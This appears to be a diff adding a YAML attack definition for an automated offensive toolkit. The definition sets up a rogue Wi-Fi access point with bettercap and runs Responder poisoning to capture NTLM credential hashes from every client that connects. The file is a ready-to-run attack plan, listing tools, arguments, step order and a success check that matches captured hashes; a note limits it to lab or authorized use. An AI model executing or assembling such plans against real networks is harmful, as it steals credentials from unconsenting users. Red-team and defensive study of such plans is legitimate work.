@@ -1,0 +1,50 @@
+# Mech-Unit attack intent — Rogue AP with credential-harvest responder run.
+# The post-AP half of the AP capitalization subgraph: once clients associate
+# to our rogue network, responder harvests their link-local auth chatter.
+id: wifi_rogue_ap
+name: Rogue AP + Credential Harvest
+category: wireless
+operator_label: "Rogue AP that harvests client credentials"
+operator_description: >
+  Stands up an open rogue network and runs responder-style poisoning against
+  every client that associates, capturing NTLM/credential material. The
+  capitalization move after a PSK or evil-twin win.
+outcome: "Captured credential material from associated clients"
+grants: [creds.hashes, client.credential_harvest]
+time_to_impact: tens-of-minutes
+noise: medium
+risk_notes: >
+  Captures authentication material from real users. Lab/authorized use only.
+
+preconditions:
+  - probe: tools_present
+    with: [responder]
+  - probe: running_as_root
+
+plan:
+  - step: monitor_up
+    tool: monitor_mode_enable
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+
+  - step: stand_up_ap
+    tool: bettercap_mitm
+    args:
+      target: "{{ target.essid }}"
+      module: wifi
+    max_wait: 60
+    on_fail: warn
+
+  - step: poison
+    tool: responder_poison
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+    max_wait: 600
+    gate:
+      output: "NTLMv2|Hash|Capture"
+    on_fail: warn
+
+artifacts:
+  responder_logs: "{{ plan_dir }}/responder-logs"
+
+llm_required: false
